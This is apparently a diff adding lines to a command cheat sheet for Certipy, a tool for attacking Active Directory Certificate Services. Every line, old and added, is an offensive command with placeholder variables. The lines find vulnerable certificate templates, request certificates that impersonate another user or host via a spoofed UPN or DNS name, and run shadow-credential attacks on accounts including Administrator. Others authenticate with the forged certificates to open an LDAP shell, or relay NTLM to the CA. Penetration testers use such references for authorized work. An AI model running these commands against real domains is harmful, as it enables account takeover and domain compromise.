@@ -5,3 +5,12 @@ certipy req -u "$USER@$DOMAIN" -hashes "$NT_HASH" -ca "$CA_NAME" -target "$CA_FQ
 certipy relay -ca "$CA_FQDN" -template "$ESC8_TEMPLATE_NAME"
 certipy shadow auto -u "$USER@$DOMAIN" -p "$PASSWORD" -account "Administrator"
 certipy auth -pfx "$USER".pfx -dc-ip "$IP" -domain "$DOMAIN" -debug
+certipy-ad shadow auto -username "$USER@$DOMAIN" -password "$PASSWORD" -account "$TARGET_USER"
+certipy-ad find -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$IP" -vulnerable
+certipy-ad find -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$IP" -vulnerable -enabled -stdout
+certipy-ad req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$IP" -target "$TARGET" -ca "$CA_NAME" -template "$TEMPLATE"
+certipy-ad req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$IP" -target "$TARGET" -ca "$CA_NAME" -template "$TEMPLATE" -upn "$TARGET_USER" -out result.pfx
+certipy-ad req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$IP" -target "$TARGET" -ca "$CA_NAME" -template "$TEMPLATE" -dns "$TARGET"
+certipy-ad auth -pfx result.pfx -dc-ip "$IP"
+certipy-ad auth -pfx result.pfx -dc-ip "$IP" -ldap-shell
+certipy-ad relay -ca "$TARGET" -template "$TEMPLATE"
